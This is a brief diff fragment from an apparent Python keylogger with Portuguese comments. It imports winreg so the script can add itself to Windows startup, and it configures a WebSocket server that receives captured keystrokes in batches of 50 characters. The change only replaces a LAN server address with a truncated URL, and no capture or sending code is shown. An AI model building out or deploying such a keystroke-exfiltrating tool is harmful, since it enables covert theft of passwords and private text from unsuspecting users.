@@ -10,7 +10,7 @@ import winreg  # Para adicionar ao registro de inicialização
 import socketio
 
 # --- Configurações ---
-SERVER_WS_URL = "ws://192.168.0.32:5000"  # URL do servidor WebSocket
+SERVER_WS_URL = "ws:"  # URL do servidor WebSocket
 LOG_CHARS_LIMIT = 50  # Quantidade máxima de teclas para enviar por vez
 
 typed_chars = ""
